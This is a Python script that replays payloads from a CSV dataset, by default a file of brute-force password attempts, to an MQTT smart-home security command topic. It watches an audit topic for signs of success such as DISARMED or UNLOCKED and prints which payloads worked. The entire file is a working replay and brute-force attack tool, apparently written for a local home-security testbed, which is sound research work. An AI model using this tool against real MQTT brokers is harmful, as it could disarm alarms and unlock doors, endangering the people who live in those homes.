import argparse
import csv
import os
import time

import paho.mqtt.client as mqtt
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# --- Configuration ---
BROKER_IP = os.getenv("MQTT_BROKER_LOCAL", "localhost")
CMD_TOPIC = os.getenv("MQTT_TOPIC_SECURITY_CMD", "shtsp/home/security/cmd")
AUDIT_TOPIC = os.getenv("MQTT_TOPIC_SECURITY_AUDIT", "shtsp/home/security/audit")
PORT = int(os.getenv("MQTT_PORT", "1883"))
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
DATASET_ROOT = os.path.join(PROJECT_ROOT, "app", "dataset")

# Global variables for success detection
attack_results = []
current_payload = None
success_detected = False


def on_audit_message(client, userdata, msg):
    global success_detected, current_payload
    payload = msg.payload.decode(errors="replace")
    print(f"📊 AUDIT: {payload}")

    # Check for success indicators in audit messages
    success_indicators = ["DISARMED", "UNLOCKED", "ACCESS_GRANTED", "SUCCESS"]
    if any(indicator in payload.upper() for indicator in success_indicators):
        success_detected = True
        print(f"✅ SUCCESS DETECTED for payload: {current_payload}")


def load_dataset(dataset_path: str, payload_column: str):
    if not os.path.isabs(dataset_path):
        dataset_path = os.path.join(DATASET_ROOT, dataset_path)

    if not os.path.exists(dataset_path):
        raise FileNotFoundError(f"Dataset file not found: {dataset_path}")

    with open(dataset_path, newline="", encoding="utf-8", errors="replace") as file:
        reader = csv.DictReader(file)
        if payload_column not in reader.fieldnames:
            raise ValueError(
                f"Column '{payload_column}' not found in dataset. Available columns: {reader.fieldnames}"
            )

        return [row[payload_column] for row in reader if row.get(payload_column)]


def publish_payloads(payloads, delay=0.5, wait_for_response=2.0):
    global attack_results, current_payload, success_detected

    if not payloads:
        print("No payloads available to publish.")
        return

    # Setup audit listener
    audit_client = mqtt.Client(client_id="Hacker_Audit_Listener", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    audit_client.on_message = on_audit_message
    audit_client.connect(BROKER_IP, PORT)
    audit_client.subscribe(AUDIT_TOPIC)
    audit_client.loop_start()

    # Setup publisher
    publish_client = mqtt.Client(client_id="Hacker_Replay_Device", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    publish_client.connect(BROKER_IP, PORT)
    publish_client.loop_start()

    attack_results = []

    for i, payload in enumerate(payloads, start=1):
        current_payload = payload
        success_detected = False

        # Publish the payload
        publish_client.publish(CMD_TOPIC, payload)
        print(f"[{i}] Published payload: {payload}")

        # Wait for potential response
        time.sleep(wait_for_response)

        # Record result
        result = "SUCCESS" if success_detected else "NO_RESPONSE"
        attack_results.append({
            "index": i,
            "payload": payload,
            "result": result
        })

        time.sleep(delay - wait_for_response if delay > wait_for_response else 0.1)

    publish_client.loop_stop()
    publish_client.disconnect()
    audit_client.loop_stop()
    audit_client.disconnect()

    # Display final results
    print("\n" + "="*50)
    print("🎯 ATTACK RESULTS SUMMARY")
    print("="*50)

    successful = sum(1 for r in attack_results if r["result"] == "SUCCESS")
    total = len(attack_results)

    print(f"Total payloads tested: {total}")
    print(f"Successful attacks: {successful}")
    print(f"Success rate: {successful/total*100:.1f}%" if total > 0 else "Success rate: N/A")

    if successful > 0:
        print("\n✅ SUCCESSFUL PAYLOADS:")
        for result in attack_results:
            if result["result"] == "SUCCESS":
                print(f"  - {result['payload']}")
    else:
        print("\n❌ No successful attacks detected.")

    print("\n✅ Dataset-driven replay finished.")


def main():
    parser = argparse.ArgumentParser(description="Dataset-driven MQTT replay attack.")
    parser.add_argument("--dataset", default="brute_attempts_1777965941.csv", help="CSV dataset filename inside app/dataset/")
    parser.add_argument("--payload-column", default="password", help="CSV column to use as published payload")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between published messages")
    parser.add_argument("--limit", type=int, default=0, help="Maximum payloads to publish")
    parser.add_argument("--wait-response", type=float, default=2.0, help="Seconds to wait for success response after each payload")
    args = parser.parse_args()

    payloads = load_dataset(args.dataset, args.payload_column)
    if args.limit > 0:
        payloads = payloads[: args.limit]

    print(f"📡 Replaying {len(payloads)} payloads from dataset '{args.dataset}' to topic '{CMD_TOPIC}'...")
    print(f"Broker: {BROKER_IP}:{PORT}")
    print(f"Listening for responses on audit topic: {AUDIT_TOPIC}")
    print(f"Waiting {args.wait_response}s for each response...")
    publish_payloads(payloads, args.delay, args.wait_response)


if __name__ == "__main__":
    main()
